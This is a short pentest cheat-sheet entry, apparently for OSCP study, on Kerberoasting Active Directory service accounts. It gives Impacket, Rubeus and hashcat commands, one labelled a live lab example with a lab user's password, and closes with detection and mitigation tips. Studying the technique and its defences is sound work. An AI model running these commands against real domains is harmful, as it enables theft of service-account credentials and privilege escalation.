# Kerberoast
**What:** Request service tickets (TGS) for SPNs, export ticket ciphertext and crack offline to recover service account passwords.  
**Privileges needed:** Any authenticated domain user.  
**Common tools:** Impacket `GetUserSPNs.py`, Rubeus.
- https://github.com/GhostPack/Rubeus
```bash
# OSCP-A live example
impacket-GetUserSPNs -dc-host dc01.oscp.exam -dc-ip 10.10.158.140  oscp.exam/Eric.Wallows:'EricLikesRunning800' -request > kerberroast.hash

# Request all service tickets for domain
# I think this command is wrong, and will be ./invoke-rubeus.ps1
# Invoke-Rubeus -Command "<rubeus_arguments>"
Rubeus.exe kerberoast /domain:corp.local /outfile:kerb.hashes

hashcat -m 13100 kerberoast.hashes /path/to/wordlist.txt
```
**Detection / Mitigation**
- Monitor high volumes of TGS requests from single accounts or unusual workstation sources.
- Enforce strong service-account passwords, avoid long-lived/high-privilege service accounts, use managed service accounts (gMSA), and enable AS-REP/preauth where appropriate.

